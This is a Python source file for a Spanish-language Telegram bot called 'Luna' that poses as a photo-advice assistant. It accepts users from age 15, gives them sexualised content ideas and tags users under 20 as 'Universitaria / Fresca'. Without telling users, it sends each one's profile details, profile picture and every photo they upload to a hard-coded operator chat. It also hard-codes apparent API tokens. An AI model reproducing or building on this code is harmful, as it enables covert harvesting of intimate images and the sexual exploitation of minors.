import os
import io
import random
import asyncio
import base64
import sqlite3
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from groq import Groq
import staypresent

# ==========================================
# 1. CONFIGURACIÓN GLOBAL
# ==========================================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 

client = Groq(api_key=GROQ_API_KEY)
bot_pausado = False

# ==========================================
# 2. BASE DE DATOS SQLITE
# ==========================================
def init_db():
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, 
                 nivel INTEGER, puntos INTEGER, estilo TEXT, fetiche TEXT, 
                 fecha_registro TEXT, ultima_actividad TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad, nivel, puntos, estilo, fetiche):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, nombre, username, edad, nivel, puntos, estilo, fetiche, 
               datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def actualizar_usuario(user_id, campo, valor):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute(f"UPDATE usuarios SET {campo} = ? WHERE id = ?", (valor, user_id))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ==========================================
# 3. TEXTOS Y RESPUESTAS
# ==========================================
MENSAJES_PROCESANDO = [
    "🔍 **Encendiendo visión artificial...**\nAnalizando tu foto. Dame unos segundos.",
    "🧠 **Procesando imagen...**\nMi IA está revisando la luz y el encuadre. Un momento.",
    "✨ **Analizando composición...**\nBuscando la mejor manera de resaltar tu belleza."
]

CONSEJOS_LUZ = [
    "💡 La luz lateral es tu mejor amiga, marca los músculos y las curvas.",
    "💡 Si la luz es muy dura, pon una sábana blanca entre la lámpara y tú.",
    "💡 La luz de la ventana por la mañana es la más favorecedora."
]

CONSEJOS_POSE = [
    "💃 Arquear un poco la espalda resalta tus curvas.",
    "💃 Relaja los hombros y baja la barbilla, da un aire de misterio.",
    "💃 Separa los brazos de la cintura para estilizar tu silueta."
]

CONSEJOS_FETICHES = [
    "🔞 Prueba con un poco de lencería de encaje, el contraste es muy popular.",
    "🔞 El uso de aceites corporales le da un brillo que llama la atención.",
    "🔞 Juega con el misterio, dejar poco a la imaginación es más exitoso."
]

IDEAS_CONTENIDO = [
    "📸 Graba un video corto quitándote una prenda lentamente.",
    "📸 Haz una sesión con lencería de encaje y luz cálida.",
    "📸 Usa un espejo para mostrar un ángulo diferente."
]

FRASES_MOTIVADORAS = [
    "¡Vas por buen camino! Sigue así.",
    "Cada foto que subes te acerca más al éxito.",
    "La constancia es la clave del triunfo."
]

# ==========================================
# 4. IA CON GROQ
# ==========================================
def analizar_foto_con_groq(imagen_bytes):
    try:
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": "Eres Luna, experta fotógrafa de adultos. Describe brevemente lo que ves (lencería, cama, pose) y da 2 consejos sutiles. Sé profesional."},
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                    ]
                }
            ],
            model="qwen/qwen3.8-27b",
        )
        return completion.choices[0].message.content
    except Exception as e:
        print(f"Error en Groq Vision: {e}")
        return f"📸 **Lo que veo:** una persona.\n\n💡 **Consejos:**\n{random.choice(CONSEJOS_LUZ)}\n{random.choice(CONSEJOS_POSE)}"

async def conversar_con_ia(texto_usuario):
    try:
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, asistente amigable. Responde natural y breve."},
                {"role": "user", "content": texto_usuario}
            ],
            model="llama3-8b-8192",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return "Lo siento, me distraje. ¿Qué me decías?"

# ==========================================
# 5. FUNCIONES AUXILIARES
# ==========================================
async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        username = f"@{user.username}" if user.username else "Oculto"
        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada"
        
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
            f"👤 **Nombre:** {user.first_name}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# ==========================================
# 6. COMANDOS
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. 🌙")
    user_id = update.effective_user.id
    
    if not obtener_usuario(user_id):
        mensaje = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen.\n\n"
            "📸 Analizo tus fotos y te doy consejos.\n"
            "💡 Converso contigo y te doy ideas.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje)
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o escríbeme.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    
    if obtener_usuario(user.id):
        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_ia(text)
        await update.message.reply_text(respuesta)
        return

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"
            
            fetiche = random.choice(CONSEJOS_FETICHES)
            guardar_usuario(user.id, user.first_name, user.username, edad, 1, 0, estilo, fetiche)
            
            await update.message.reply_text(f"✅ ¡Todo listo! Envíame fotos o escríbeme.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Rango: 15 a 80 años.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def pedir_idea(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"💡 **Idea:**\n{random.choice(IDEAS_CONTENIDO)}")

async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = obtener_usuario(user_id)
    if not user_data: return await update.message.reply_text("Primero envíame tu fecha.")
    nivel = user_data[4]
    pts = user_data[5]
    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "?")
    await update.message.reply_text(f"👤 **Perfil**\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM usuarios")
    total = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {total}\n⚙️ Estado: {'Pausado' if bot_pausado else 'Activo'}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
    
    msg_espera = await update.message.reply_text(random.choice(MENSAJES_PROCESANDO))
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    sugerencia = analizar_foto_con_groq(photo_bytes)
    await msg_espera.edit_text(sugerencia)
    
    user_data = obtener_usuario(user_id)
    puntos_actuales = user_data[5] + 10
    nivel_actual = user_data[4]
    
    if puntos_actuales >= 50 and nivel_actual == 1:
        nivel_actual = 2
        await update.message.reply_text("🎉 ¡Nivel Intermedia 🌿!")
    elif puntos_actuales >= 150 and nivel_actual == 2:
        nivel_actual = 3
        await update.message.reply_text("🏆 ¡Nivel Avanzada 🌳!")
        
    actualizar_usuario(user_id, 'puntos', puntos_actuales)
    actualizar_usuario(user_id, 'nivel', nivel_actual)
    
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Foto")

# ==========================================
# 7. MAIN CON STAYPRESENT
# ==========================================
def main():
    # 1. Configurar el servidor web de StayPresent
    staypresent.web.json({"status": "running", "service": "Luna Bot"})
    
    # 2. Auto-ping a la URL pública de Render cada 4 minutos
    # CAMBIA ESTO por tu URL real de Render
    staypresent.cron("https://luna-bot-atfc.onrender.com", interval=240)
    
    # 3. Iniciar el bot (pasando el token como variable de entorno o directo)
    os.environ["TELEGRAM_TOKEN"] = TELEGRAM_TOKEN
    
    # 4. Arrancar el bot con StayPresent
    staypresent.run(
        "bot.py",  # Nombre del archivo donde está la lógica (lo crearemos abajo)
        port=int(os.getenv("PORT", 8080)),
        restart_on_crash=True,
        max_restarts=5
    )

if __name__ == "__main__":
    main()
